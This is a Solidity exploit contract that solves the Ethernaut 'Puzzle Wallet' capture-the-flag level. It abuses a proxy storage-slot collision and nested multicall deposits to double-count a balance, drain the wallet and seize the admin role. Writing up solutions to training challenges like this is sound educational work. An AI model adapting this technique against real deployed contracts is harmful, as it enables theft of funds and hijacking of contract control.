// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol';
// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/IERC20.sol';
// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/ERC20.sol';

interface Instance {
    function maxBalance() external view returns(uint256);
    function owner() external view returns(address);
    function admin()  external view returns(address);
    function pendingAdmin()  external view returns(address);
    function whitelisted(address user) external view returns(bool);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;
}

// https://github.com/maAPPsDEV/puzzle-wallet-attack
// Slot	Variable
// 0	pendingAdmin/owner
// 1	admin/maxBalance
// 2	whitelisted
// 3	balances

contract Ethernaut {
    
    constructor(address instance) public  payable {

        require(msg.value==address(instance).balance,"msg.value error");

        // set pendingAdmin/owner
        Instance(instance).proposeNewAdmin(address(this));
        Instance(instance).addToWhitelist(address(this));

        // re-enter to double balance
        bytes[] memory array1 = new bytes[](1);
        bytes[] memory array2 = new bytes[](2);

        bytes memory data1  = abi.encodeWithSelector(Instance.deposit.selector);
        array1[0] = data1;

        bytes memory data2 = abi.encodeWithSelector(Instance.multicall.selector,array1);
        array2[0] = data1;
        array2[1] = data2;

        bytes memory data3 = abi.encodeWithSelector(Instance.multicall.selector,array2);

        (bool success,) = address(instance).call{value:msg.value}(data3);
        require(success, "FFFAIL");


        // withdraw
        Instance(instance).execute(msg.sender,msg.value*2,abi.encodePacked(""));

        // set admin/maxBalance
        Instance(instance).setMaxBalance(uint160(address(msg.sender)));
    }

}
